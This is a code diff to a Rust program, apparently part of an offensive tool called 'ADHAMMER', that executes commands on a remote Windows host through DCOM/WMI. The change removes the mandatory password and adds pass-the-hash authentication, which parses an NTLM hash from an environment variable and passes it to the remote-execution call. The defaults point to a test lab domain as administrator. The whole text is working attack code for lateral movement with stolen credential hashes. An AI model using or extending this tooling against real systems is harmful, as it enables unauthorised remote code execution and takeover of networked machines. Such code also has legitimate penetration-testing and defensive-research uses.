@@ -8,7 +8,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let host = env::var("DC").unwrap_or_else(|_| "10.10.10.22".into());
     let domain = env::var("D").unwrap_or_else(|_| "TESTLAB".into());
     let user = env::var("U").unwrap_or_else(|_| "administrator".into());
-    let pass = env::var("P").expect("set P=<password>");
+    let pass = env::var("P").unwrap_or_default();
     let clsid = "8bc3f05e-d86b-11d0-a075-00c04fb68820"; // CLSID_WbemLevel1Login
     let iid = "f309ad18-d86a-11d0-a075-00c04fb68820"; // IID_IWbemLevel1Login
 
@@ -20,7 +20,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("{}", stub.iter().map(|b| format!("{b:02x}")).collect::<String>());
         return Ok(());
     }
-    let hr = dcerpc::dcom_wmi::wmi_exec(&host, &domain, &user, &pass, "ADHAMMER", &command).await?;
+    // HASH=<32 hex> for pass-the-hash instead of P=<password>.
+    let hash = env::var("HASH").ok().and_then(|h| {
+        let b = (0..16).map(|i| u8::from_str_radix(&h[i * 2..i * 2 + 2], 16)).collect::<Result<Vec<_>, _>>().ok()?;
+        b.try_into().ok()
+    });
+    let hr =
+        dcerpc::dcom_wmi::wmi_exec(&host, &domain, &user, &pass, hash.as_ref(), "ADHAMMER", &command)
+            .await?;
     println!("[+] Win32_Process.Create HRESULT=0x{:08x}", hr as u32);
     if hr == 0 {
         println!("[+] PROCESS CREATED via WMI: {command}");
